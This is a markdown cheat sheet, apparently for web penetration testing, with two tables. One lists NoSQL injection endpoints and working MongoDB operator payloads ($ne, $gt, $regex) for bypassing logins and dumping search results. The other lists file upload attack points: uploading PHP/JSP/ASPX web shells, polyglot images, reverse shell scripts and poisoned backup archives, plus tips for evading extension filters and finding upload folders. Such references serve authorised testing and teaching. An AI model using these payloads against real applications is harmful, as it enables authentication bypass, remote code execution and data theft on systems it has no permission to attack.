### 🧩 NoSQL Injection – Target Points & Payloads

| Endpoint Example                  | Method | Parameter/Field     | Location        | Example Payload                         |
|----------------------------------|--------|---------------------|------------------|------------------------------------------|
| `/api/user/login`                | POST   | `username`, `pass`  | JSON Body        | `{ "username": { "$ne": null }, "password": { "$ne": null } }` |
| `/search`                        | POST   | `searchTerm`        | JSON Body        | `{ "search": { "$gt": "" } }`            |
| `/product?id=xyz`                | GET    | `id`                | URL Param        | `?id[$ne]=1`                             |
| `/api/comments/filter`          | POST   | `filter[user]`      | JSON/Query       | `"filter": { "user": { "$ne": null } }`  |
| `/login` (MongoDB based)         | POST   | JSON input          | Web Form/API     | `{ "username": {"$regex": ".*"}, "password": {"$regex": ".*"} }` |

🔍 *MongoDB, CouchDB, and other NoSQL-based apps are vulnerable when user-controlled JSON is not sanitized properly.*

---

### 🧾 File Upload Vulnerabilities – Lookout Zones

| Endpoint Example                  | Method | Parameter/Field     | Location        | Exploit/Payload Type                   |
|----------------------------------|--------|---------------------|------------------|----------------------------------------|
| `/upload`                        | POST   | `file`              | Multipart Form   | Upload `.php`, `.jsp`, or `.aspx` files|
| `/api/profile/picture`           | POST   | `image`             | API Form Upload  | Polyglot image with embedded JS/PHP    |
| `/support/ticket/attachment`     | POST   | `attachment`        | Form/API Upload  | Upload reverse shell script file       |
| `/editor` (Rich Text)            | POST   | `html`, `doc` file  | WYSIWYG/Editor   | Upload HTML file with JS script inside |
| `/backup/restore`                | POST   | `.zip` or `.tar.gz` | API/Panel Upload | Inject malicious code in backup files  |

💡 Try uploading a `.php5`, `.phtml`, `.htaccess`, or renamed extension to bypass filters. Also, monitor the **upload folder paths**—often exposed as `/uploads`, `/assets`, or `/userfiles`.

